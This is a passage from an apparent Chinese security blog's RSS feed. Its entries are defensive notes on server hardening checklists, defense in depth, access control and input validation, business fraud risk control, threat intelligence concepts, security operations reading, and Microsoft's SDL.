&lt;h2 id=&#34;iis&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#iis&#34;&gt;#&lt;/a&gt; IIS&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;版本是否最新&lt;/li&gt;
&lt;li&gt;日志配置&lt;/li&gt;
&lt;li&gt;用户口令配置&lt;/li&gt;
&lt;li&gt;ASP.NET 功能配置&lt;/li&gt;
&lt;li&gt;配置超时时间防 DoS&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;jboss&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#jboss&#34;&gt;#&lt;/a&gt; JBoss&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;jmx console 配置&lt;/li&gt;
&lt;li&gt;web console 配置&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;tomcat&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#tomcat&#34;&gt;#&lt;/a&gt; Tomcat&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;禁用部分 HTTP 动词&lt;/li&gt;
&lt;li&gt;禁止列目录&lt;/li&gt;
&lt;li&gt;禁止 manager 功能&lt;/li&gt;
&lt;li&gt;用户密码配置&lt;/li&gt;
&lt;li&gt;用户权限配置&lt;/li&gt;
&lt;li&gt;配置超时时间防 DoS&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;密码管理策略&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#密码管理策略&#34;&gt;#&lt;/a&gt; 密码管理策略&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;长度不少于 8 个字符&lt;/li&gt;
&lt;li&gt;不存在于已有字典之中&lt;/li&gt;
&lt;li&gt;不使用基于知识的认证方式&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;参考链接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#参考链接&#34;&gt;#&lt;/a&gt; 参考链接&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL1BhdWxTZWMvYXdlc29tZS13aW5kb3dzLWRvbWFpbi1oYXJkZW5pbmc=&#34;&gt;awesome windows domain hardening&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vemgtY24vd2luZG93cy9zZWN1cml0eS90aHJlYXQtcHJvdGVjdGlvbi9taWNyb3NvZnQtZGVmZW5kZXItYXRwL2N1c3RvbWl6ZS1hdHRhY2stc3VyZmFjZS1yZWR1Y3Rpb24=&#34;&gt;customize attack surface reduction&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Defense%20techniques/%E9%98%B2%E5%BE%A1%E6%A1%86%E6%9E%B6/</guid>
            <title>防御框架</title>
            <link>https://mobius-0.github.io/security/WebNote/Defense%20techniques/%E9%98%B2%E5%BE%A1%E6%A1%86%E6%9E%B6/</link>
            <category>防御纵深</category>
            <category>访问控制</category>
            <category>过滤</category>
            <category>框架</category>
            <pubDate>Mon, 05 Dec 2022 16:15:15 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;防御纵深&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#防御纵深&#34;&gt;#&lt;/a&gt; 防御纵深&lt;/h1&gt;
&lt;p&gt;根据纵深，防御可以分为物理层、数据层、终端层、系统层、网络层、应用层几层。这几层纵深存在层层递进相互依赖的关系。&lt;/p&gt;
&lt;h2 id=&#34;物理层&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#物理层&#34;&gt;#&lt;/a&gt; 物理层&lt;/h2&gt;
&lt;p&gt;物理层实际应用中接触较少，但仍是非常重要的位置。如果物理层设计不当，很容易被攻击者通过物理手段绕过上层防御。&lt;/p&gt;
&lt;h2 id=&#34;数据层&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#数据层&#34;&gt;#&lt;/a&gt; 数据层&lt;/h2&gt;
&lt;p&gt;数据处于防御纵深较底层的位置，攻击的目标往往也是为了拿到数据，很多防御也是围绕数据不被破坏、窃取等展开的。&lt;/p&gt;
&lt;h2 id=&#34;终端层&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#终端层&#34;&gt;#&lt;/a&gt; 终端层&lt;/h2&gt;
&lt;p&gt;终端包括 PC、手机、IoT 以及其他的智能设备，连入网络的终端是否可信是需要解决的问题。&lt;/p&gt;
&lt;h2 id=&#34;系统层&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#系统层&#34;&gt;#&lt;/a&gt; 系统层&lt;/h2&gt;
&lt;p&gt;操作系统运行在终端上，可能会存在提权、非授权访问等问题。&lt;/p&gt;
&lt;h2 id=&#34;网络层&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#网络层&#34;&gt;#&lt;/a&gt; 网络层&lt;/h2&gt;
&lt;p&gt;网络层使用通信线路将多台计算机相互连接起来，依照商定的协议进行通信。网络层存在 MITM、DDoS 等攻击。&lt;/p&gt;
&lt;h2 id=&#34;应用层&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#应用层&#34;&gt;#&lt;/a&gt; 应用层&lt;/h2&gt;
&lt;p&gt;应用层是最上层，主要涉及到 Web 应用程序的各种攻击。&lt;/p&gt;
&lt;h1 id=&#34;访问控制&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#访问控制&#34;&gt;#&lt;/a&gt; 访问控制&lt;/h1&gt;
&lt;p&gt;Web 应用需要限制用户对应用程序的数据和功能的访问，以防止用户未经授权访问。访问控制的过程可以分为验证、会话管理和访问控制三个地方。&lt;/p&gt;
&lt;h2 id=&#34;验证机制&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#验证机制&#34;&gt;#&lt;/a&gt; 验证机制&lt;/h2&gt;
&lt;p&gt;验证机制在一个应用程序的用户访问处理中是一个最基本的部分，验证就是确定该用户的有效性。大多数的 web 应用都采用使用的验证模型，即用户提交一个用户名和密码，应用检查它的有效性。在银行等安全性很重要的应用程序中，基本的验证模型通常需要增加额外的证书和多级登录过程，比如客户端证书、硬件等。&lt;/p&gt;
&lt;h2 id=&#34;会话管理&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#会话管理&#34;&gt;#&lt;/a&gt; 会话管理&lt;/h2&gt;
&lt;p&gt;为了实施有效的访问控制，应用程序需要一个方法来识别和处理这一系列来自每个不同用户的请求。大部分程序会为每个会话创建一个唯一性的 token 来识别。&lt;/p&gt;
&lt;p&gt;对攻击者来说，会话管理机制高度地依赖于 token 的安全性。在部分情况下，一个攻击者可以伪装成受害的授权用户来使用 Web 应用程序。这种情况可能有几种原因，其一是 token 生成的算法的缺陷，使得攻击者能够猜测到其他用户的 token；其二是 token 后续处理的方法的缺陷，使得攻击者能够获得其他用户的 token。&lt;/p&gt;
&lt;h2 id=&#34;访问控制-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#访问控制-2&#34;&gt;#&lt;/a&gt; 访问控制&lt;/h2&gt;
&lt;p&gt;处理用户访问的最后一步是正确决定对于每个独立的请求是允许还是拒绝。如果前面的机制都工作正常，那么应用程序就知道每个被接受到的请求所来自的用户的 id，并据此决定用户对所请求要执行的动作或要访问的数据是否得到了授权。&lt;/p&gt;
&lt;p&gt;由于访问控制本身的复杂性，这使得它成为攻击者的常用目标。开发者经常对用户会如何与应用程序交互作出有缺陷的假设，也经常省略了对某些应用程序功能的访问控制检查。&lt;/p&gt;
&lt;h1 id=&#34;输入处理&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#输入处理&#34;&gt;#&lt;/a&gt; 输入处理&lt;/h1&gt;
&lt;p&gt;很多对 Web 应用的攻击都涉及到提交未预期的输入，它导致了该应用程序设计者没有料到的行为。因此，对于应用程序安全性防护的一个关键的要求是它必须以一个安全的方式处理用户的输入。&lt;/p&gt;
&lt;p&gt;基于输入的漏洞可能出现在一个应用程序的功能的任何地方，并与其使用的技术类型相关。对于这种攻击，输入验证是常用的必要防护。常用的防护机制有如下几种：黑名单、白名单、过滤、处理。&lt;/p&gt;
&lt;h2 id=&#34;黑名单&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#黑名单&#34;&gt;#&lt;/a&gt; 黑名单&lt;/h2&gt;
&lt;p&gt;黑名单包含已知的被用在攻击方面的一套字面上的字符串或模式，验证机制阻挡任何匹配黑名单的数据。&lt;/p&gt;
&lt;p&gt;一般来说，这种方式是被认为是输入效果较差的一种方式。主要有两个原因，其一 Web 应用中的一个典型的漏洞可以使用很多种不同的输入来被利用，输入可以是被加密的或以各种不同的方法表示。&lt;/p&gt;
&lt;p&gt;其二，漏洞利用的技术是在不断地改进的，有关利用已存在的漏洞类型的新的方法不可能被当前黑名单阻挡。&lt;/p&gt;
&lt;h2 id=&#34;白名单&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#白名单&#34;&gt;#&lt;/a&gt; 白名单&lt;/h2&gt;
&lt;p&gt;白名单包含一系列的字符串、模式或一套标准来匹配符合要求的输入。这种检查机制允许匹配白名单的数据，阻止之外的任何数据。这种方式相对比较有效，但需要比较好的设计。&lt;/p&gt;
&lt;h2 id=&#34;过滤&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#过滤&#34;&gt;#&lt;/a&gt; 过滤&lt;/h2&gt;
&lt;p&gt;过滤会删除潜在的恶意字符并留下安全的字符，基于数据过滤的方式通常是有效的，并且在许多情形中，可作为处理恶意输入的通用解决方案。&lt;/p&gt;
&lt;h2 id=&#34;安全地处理数据&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#安全地处理数据&#34;&gt;#&lt;/a&gt; 安全地处理数据&lt;/h2&gt;
&lt;p&gt;非常多的 web 应用程序漏洞的出现是因为用户提供的数据是以不安全的方法被处理的。在一些情况下，存在安全的编程方法能够避免通常的问题。例如，SQL 注入攻击能够通过预编译的方式组织，XSS 在大部分情况下能够被转义所防御。&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Defense%20techniques/%E9%A3%8E%E9%99%A9%E6%8E%A7%E5%88%B6/</guid>
            <title>风险控制</title>
            <link>https://mobius-0.github.io/security/WebNote/Defense%20techniques/%E9%A3%8E%E9%99%A9%E6%8E%A7%E5%88%B6/</link>
            <category>风险</category>
            <category>控制</category>
            <pubDate>Mon, 05 Dec 2022 16:08:15 +0800</pubDate>
            <description><![CDATA[ &lt;h2 id=&#34;常见风险&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常见风险&#34;&gt;#&lt;/a&gt; 常见风险&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;会员
&lt;ul&gt;
&lt;li&gt;撞库盗号&lt;/li&gt;
&lt;li&gt;账号分享&lt;/li&gt;
&lt;li&gt;批量注册&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;视频
&lt;ul&gt;
&lt;li&gt;盗播盗看&lt;/li&gt;
&lt;li&gt;广告屏蔽&lt;/li&gt;
&lt;li&gt;刷量作弊&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;活动
&lt;ul&gt;
&lt;li&gt;恶意刷&lt;/li&gt;
&lt;li&gt;薅羊毛&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;直播
&lt;ul&gt;
&lt;li&gt;挂站人气&lt;/li&gt;
&lt;li&gt;恶意图文&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;电商
&lt;ul&gt;
&lt;li&gt;恶意下单&lt;/li&gt;
&lt;li&gt;订单欺诈&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;支付
&lt;ul&gt;
&lt;li&gt;盗号盗卡&lt;/li&gt;
&lt;li&gt;洗钱&lt;/li&gt;
&lt;li&gt;恶意下单&lt;/li&gt;
&lt;li&gt;恶意提现&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;其他
&lt;ul&gt;
&lt;li&gt;钓鱼邮件&lt;/li&gt;
&lt;li&gt;恶意爆破&lt;/li&gt;
&lt;li&gt;短信轰炸&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;872-防御策略&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#872-防御策略&#34;&gt;#&lt;/a&gt; 8.7.2. 防御策略&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;核身策略
&lt;ul&gt;
&lt;li&gt;同一收货手机号&lt;/li&gt;
&lt;li&gt;同一收货地址&lt;/li&gt;
&lt;li&gt;同一历史行为&lt;/li&gt;
&lt;li&gt;同一 IP&lt;/li&gt;
&lt;li&gt;同一设备&lt;/li&gt;
&lt;li&gt;同一支付 ID&lt;/li&gt;
&lt;li&gt;LBS&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;873-异常特征&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#873-异常特征&#34;&gt;#&lt;/a&gt; 8.7.3. 异常特征&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;APP 用户异常特征
&lt;ul&gt;
&lt;li&gt;IP&lt;/li&gt;
&lt;li&gt;设备为特定型号&lt;/li&gt;
&lt;li&gt;本地 APP 列表中有沙盒 APP&lt;/li&gt;
&lt;li&gt;Root 用户&lt;/li&gt;
&lt;li&gt;同设备登录过多个账号&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;874-参考链接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#874-参考链接&#34;&gt;#&lt;/a&gt; 8.7.4. 参考链接&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2RvYy5jb2NvbGlhbi5jbi9lc3NheS9yaXNrLzIwMTYvMTIvMTgvcmlzay0yLWRhdGFiYXNlLw==&#34;&gt;支付风控模型和流程分析&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3M/X19iaXo9TXpJME1qY3pNak0yTkE9PSZhbXA7bWlkPTIyNDc0ODM4MzYmYW1wO2lkeD0xJmFtcDtzbj1kNDY4NzVjOTU3Mjg5ZDhlMDM1MzQ1OTkyYWQ3MDUzZQ==&#34;&gt;爱奇艺业务安全风控体系的建设实践&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Defense%20techniques/%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5/</guid>
            <title>威胁情报</title>
            <link>https://mobius-0.github.io/security/WebNote/Defense%20techniques/%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5/</link>
            <category>情报</category>
            <pubDate>Mon, 05 Dec 2022 16:01:21 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;简介&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介&#34;&gt;#&lt;/a&gt; 简介&lt;/h1&gt;
&lt;h2 id=&#34;产生原因&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#产生原因&#34;&gt;#&lt;/a&gt; 产生原因&lt;/h2&gt;
&lt;p&gt;新一代的攻击者常常向企业和组织发起针对性的网络攻击，这种针对性强的攻击，一般经过了精心的策划，攻击方法、途径复杂，后果严重。在面对这种攻击时，攻防存在着严重的不对等，为了尽可能消除这种不对等，威胁情报 (Threat Intelligence) 应运而生。&lt;/p&gt;
&lt;h2 id=&#34;定义&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#定义&#34;&gt;#&lt;/a&gt; 定义&lt;/h2&gt;
&lt;p&gt;威胁情报 (Threat Intelligence)，也被称作安全情报 (Security Intelligence)、安全威胁情报 (Security Threat Intelligence)。&lt;/p&gt;
&lt;p&gt;关于威胁情报的定义有很多，一般是指从安全数据中提炼的，与网络空间威胁相关的信息，包括威胁来源、攻击意图、攻击手法、攻击目标信息，以及可用于解决威胁或应对危害的知识。广义的威胁情报也包括情报的加工生产、分析应用及协同共享机制。相关的概念有资产、威胁、脆弱性等，具体定义如下。&lt;/p&gt;
&lt;p&gt;一般威胁情报需要包含威胁源、攻击目的、攻击对象、攻击手法、漏洞、攻击特征、防御措施等。威胁情报在事前可以起到预警的作用，在威胁发生时可以协助进行检测和响应，在事后可以用于分析和溯源。&lt;/p&gt;
&lt;p&gt;常见的网络威胁情报服务有黑客或欺诈团体分析、社会媒体和开源信息监控、定向漏洞研究、定制的人工分析、实时事件通知、凭据恢复、事故调查、伪造域名检测等。&lt;/p&gt;
&lt;p&gt;在威胁情报方面，比较有代表性的厂商有 BAE Systems Applied Intelligence、Booz Allen、RSA、IBM、McAfee、赛门铁克、FireEye 等。&lt;/p&gt;
&lt;h1 id=&#34;相关概念&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#相关概念&#34;&gt;#&lt;/a&gt; 相关概念&lt;/h1&gt;
&lt;h2 id=&#34;资产asset&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#资产asset&#34;&gt;#&lt;/a&gt; 资产 (Asset)&lt;/h2&gt;
&lt;p&gt;对组织具有价值的信息或资源，属于内部情报，通过资产测绘等方式发现。&lt;/p&gt;
&lt;h2 id=&#34;威胁threat&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#威胁threat&#34;&gt;#&lt;/a&gt; 威胁 (Threat)&lt;/h2&gt;
&lt;p&gt;能够通过未授权访问、毁坏、揭露、数据修改和或拒绝服务对系统造成潜在危害的起因，威胁可由威胁的主体 (威胁源)、能力、资源、动机、途径、可能性和后果等多种属性来刻画&lt;/p&gt;
&lt;h2 id=&#34;脆弱性-漏洞vulnerability&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#脆弱性-漏洞vulnerability&#34;&gt;#&lt;/a&gt; 脆弱性 / 漏洞 (Vulnerability)&lt;/h2&gt;
&lt;p&gt;可能被威胁如攻击者利用的资产或若干资产薄弱环节。&lt;/p&gt;
&lt;p&gt;漏洞存在多个周期，最开始由安全研究员或者攻击者发现，而后出现在社区公告 / 官方邮件 / 博客中。随着信息的不断地传递，漏洞情报出现在开源社区等地方，并带有 PoC 和漏洞细节分析。再之后出现自动化工具开始大规模传播，部分漏洞会造成社会影响并被媒体报道，最后漏洞基本修复。&lt;/p&gt;
&lt;h2 id=&#34;风险risk&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#风险risk&#34;&gt;#&lt;/a&gt; 风险 (Risk)&lt;/h2&gt;
&lt;p&gt;威胁利用资产或一组资产的脆弱性对组织机构造成伤害的潜在可能。&lt;/p&gt;
&lt;h2 id=&#34;安全事件event&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#安全事件event&#34;&gt;#&lt;/a&gt; 安全事件 (Event)&lt;/h2&gt;
&lt;p&gt;威胁利用资产的脆弱性后实际产生危害的情景。&lt;/p&gt;
&lt;h1 id=&#34;情报来源&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#情报来源&#34;&gt;#&lt;/a&gt; 情报来源&lt;/h1&gt;
&lt;p&gt;为了实现情报的同步和交换，各组织都制定了相应的标准和规范。主要有国标，美国联邦政府标准等。&lt;/p&gt;
&lt;p&gt;除了国家外，企业也有各自的情报来源，例如厂商、CERT、开发者社区、安全媒体、漏洞作者或团队、公众号、个人博客、代码仓库等。&lt;/p&gt;
&lt;h1 id=&#34;威胁框架&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#威胁框架&#34;&gt;#&lt;/a&gt; 威胁框架&lt;/h1&gt;
&lt;p&gt;比较有影响力的威胁框架主要有洛克希德 - 马丁的杀伤链框架 (Cyber Kill Chain Framework)、MITRE 的 ATT&amp;amp;CK 框架 (Common Knowledge base of Adversary Tactics and Techniques)、ODNI 的 CCTF 框架 (Common Cyber Threat Framework，公共网空威胁框架)，以及 NSA 的 TCTF 框架 (Technical Cyber Threat Framework，技术性网空威胁框架)。&lt;/p&gt;
&lt;h1 id=&#34;参考链接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#参考链接&#34;&gt;#&lt;/a&gt; 参考链接&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;[Executive Perspectives on Cyber Threat Intelligence](&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9zY2FkYWhhY2tlci5jb20vbGlicmFyeS9Eb2N1bWVudHMvVGhyZWF0X0ludGVsbGlnZW5jZS9pU2lnaHQ=&#34;&gt;https://scadahacker.com/library/Documents/Threat_Intelligence/iSight&lt;/span&gt; Partners - Executive Perspectives on Cyber Threat Intelligence.pdf)&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuZGFya3JlYWRpbmcuY29tL2FuYWx5dGljcy90aHJlYXQtaW50ZWxsaWdlbmNlL2N5YmVyLXRocmVhdHMtaW5mb3JtYXRpb24tdnMtaW50ZWxsaWdlbmNlL2EvZC1pZC8xMzE2ODUx&#34;&gt;Cyber Threats: Information vs. Intelligence&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vY29sdW1uLzEzNjc2My5odG1s&#34;&gt;威胁情报简介及市场浅析&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Defense%20techniques/%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/</guid>
            <title>安全建设</title>
            <link>https://mobius-0.github.io/security/WebNote/Defense%20techniques/%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/</link>
            <category>运营</category>
            <pubDate>Mon, 05 Dec 2022 16:00:21 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;参考链接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#参考链接&#34;&gt;#&lt;/a&gt; 参考链接&lt;/h1&gt;
&lt;h1 id=&#34;安全运营&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#安全运营&#34;&gt;#&lt;/a&gt; 安全运营&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8zOTQ2NzIwMQ==&#34;&gt;我理解的安全运营 by 职业欠钱&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC84NDU5MTA5NQ==&#34;&gt;再谈安全运营 by 职业欠钱&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3M/X19iaXo9TXpJek1UQXpOelV4TVE9PSZhbXA7bWlkPTI2NTI4OTM2MTYmYW1wO2lkeD0xJmFtcDtzbj02NzM4YTRlMzMwNTBlZDA4NGQxNTM1MTk2YWVjNjA2MQ==&#34;&gt;我们谈安全运营时在谈什么 by 聂君&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly8zNmtyLmNvbS9wLzE3MjEyMzY2MzU2NDk=&#34;&gt;金融行业企业安全运营之路 by 聂君&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3M/X19iaXo9TXpJMk1qUTFOVEE0TUE9PSZhbXA7bWlkPTIyNDc0ODUwNjImYW1wO2lkeD0xJmFtcDtzbj05NGM5ZmE0MGVkZWY2ZGUwZWE0NmM0NTM0MDVlMzY4Nw==&#34;&gt;秦波：大型互联网应用安全 SDL 体系建设实践&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3M/X19iaXo9TXpJMk1qUTFOVEE0TUE9PSZhbXA7bWlkPTIyNDc0ODU0MDUmYW1wO2lkeD0xJmFtcDtzbj1iZGE5MjgzMzI5ZjZkYjE1ZDY5ZDRjZGYzN2M2MDlkMg==&#34;&gt;谭晓生：论 CISO 的个人修养&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvZXMvMjAwMDI0Lmh0bWw=&#34;&gt;赵彦的 CISO 闪电战 两年甲方安全修炼之路&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3M/X19iaXo9TXpJMk1qUTFOVEE0TUE9PSZhbXA7bWlkPTIyNDc0ODQ3MzUmYW1wO2lkeD0xJmFtcDtzbj0wMmUwNmRkODRlZTAzMjJkZDJmOWZlNzYxYjI0NDAxMw==&#34;&gt;胡珀谈安全运营 by lake2&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvcmM2WDVTbHNvUnA2czdSQ0VaNjdtQQ==&#34;&gt;小步快跑，快速迭代：安全运营的器术法道&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;资产管理&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#资产管理&#34;&gt;#&lt;/a&gt; 资产管理&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3M/X19iaXo9TXpBNU1EWTNNek15T1E9PSZhbXA7bWlkPTI2NDk0Mzk3NTEmYW1wO2lkeD0xJmFtcDtzbj0xOGFjNDlhZmY3NWVlNGIxNDMzZTQyOWRmNTZiYTQ0Yg==&#34;&gt;资产管理的难点&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Defense%20techniques/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/</guid>
            <title>安全开发</title>
            <link>https://mobius-0.github.io/security/WebNote/Defense%20techniques/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/</link>
            <category>开发过程</category>
            <pubDate>Mon, 05 Dec 2022 15:58:41 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;简介&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介&#34;&gt;#&lt;/a&gt; 简介&lt;/h1&gt;
&lt;p&gt;安全开发生命周期（Security Development Lifecycle，SDL）是微软提出的从安全的角度来指导软件开发过程的管理模式。用于帮助开发人员构建更安全的软件、解决安全合规要求，并降低开发成本。&lt;/p&gt;
&lt;h1 id=&#34;步骤&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#步骤&#34;&gt;#&lt;/a&gt; 步骤&lt;/h1&gt;
&lt;h2 id=&#34;阶段1培训&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#阶段1培训&#34;&gt;#&lt;/a&gt; 阶段 1：培训&lt;/h2&gt;
&lt;p&gt;开发团队的所有成员都必须接受适当的安全培训，了解相关的安全知识。培训对象包括开发人员、测试人员、项目经理、产品经理等。&lt;/p&gt;
&lt;h2 id=&#34;阶段2确定安全需求&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#阶段2确定安全需求&#34;&gt;#&lt;/a&gt; 阶段 2：确定安全需求&lt;/h2&gt;
&lt;p&gt;在项目确立之前，需要提前确定安全方面的需求，确定项目的计划时间，尽可能避免安全引起的需求变更。&lt;/p&gt;
&lt;h2 id=&#34;阶段3设计&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#阶段3设计&#34;&gt;#&lt;/a&gt; 阶段 3：设计&lt;/h2&gt;
&lt;p&gt;在设计阶段确定安全的最低可接受级别。考虑项目涉及到哪些攻击面、是否能减小攻击面。&lt;/p&gt;
&lt;p&gt;对项目进行威胁建模，明确可能来自的攻击有哪些方面，并考虑项目哪些部分需要进行渗透测试。&lt;/p&gt;
&lt;h2 id=&#34;阶段4实现&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#阶段4实现&#34;&gt;#&lt;/a&gt; 阶段 4：实现&lt;/h2&gt;
&lt;p&gt;实现阶段主要涉及到工具、不安全的函数、静态分析等方面。&lt;/p&gt;
&lt;p&gt;工具方面主要考虑到开发团队使用的编辑器、链接器等相关工具可能会涉及一些安全相关的问题，因此在使用工具的版本上，需要提前与安全团队进行沟通。&lt;/p&gt;
&lt;p&gt;函数方面主要考虑到许多常用函数可能存在安全隐患，应当禁用不安全的函数和 API，使用安全团队推荐的函数。&lt;/p&gt;
&lt;p&gt;代码静态分析可以由相关工具辅助完成，其结果与人工分析相结合。&lt;/p&gt;
